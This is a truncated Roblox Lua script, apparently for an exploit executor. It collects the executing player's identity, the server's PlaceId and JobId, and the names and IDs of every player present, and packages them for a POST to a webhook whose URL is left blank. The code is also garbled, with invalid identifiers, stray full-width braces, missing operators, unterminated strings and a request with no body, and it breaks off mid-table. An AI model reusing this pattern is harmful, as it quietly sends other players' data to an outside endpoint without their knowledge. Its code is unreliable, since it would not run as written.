-- =========================================================
-- PROYECT
-- =========================================================

local Players = game:GetService("Players")
local HttpService = game:GetService("httpService")
local LocalPlayer = Players.LocalPlayer

-- =========================================================
-- URL CONFI
-- =========================================================

local WEBHOOK_URL =""
local NEON GREEN = "00FF7F" --Verde neon

--==========================================================
--FEATURES
--==========================================================

local function getPlayerCount()
  return #Players:GetPlayers()
end

local function getAllUsernames()
  local usernames = ﹛﹜

  for _, player in ipairs(Players:GetPlayers()) do
   local playerData =player.Name .. " | ID: " .. player.UserId
     table.insert(usernames, playerData)
  end

  return usernames
end

local function formatUserList(UserTable)
  if  #UserTable == 0 then
    return "None"
  end 

  return table.concat(UserTable, "\n")
end

local function seendWebhook(payload)
  local request = syn and.request or http_request
  if not request then return end

  request(﹛
    Url = WEBHOOK URL,
    Method = "post",
    Headers = {
  ["Content-Type"] = "application/json
  })
end

--=========================================================
--EXECUTION SCRIPTS
--=========================================================

pcall(function()

    local playerCount =getplayerCount()
    local UserListTable = getAllUsernames()
    local formattedUser = formatUserList(UserListTable)

    local embedData =﹛

    ﹛
    ["name"] = "Executor Information",
    ["Value"] =
    "👤 Username: " .. LocalPlayer.Name .. "\n" ..
   "DisplayName: " .. LocalPlayer.DisplayName
    "UserId: " .. LocalPlayer.UserId
    ["inline"] = false
    },

{  
    ["Name"] = "Server Information",
    ["value"] =
    "PlaceId " .. tostring(game.PlaceId) .. "\n" ..
    "JobId: " .. game.JobId .. "\n" ..
    "PlayerCount: " .. tostring (PlayerCount),
    [inline = false
  },

{"name" = "Player In server
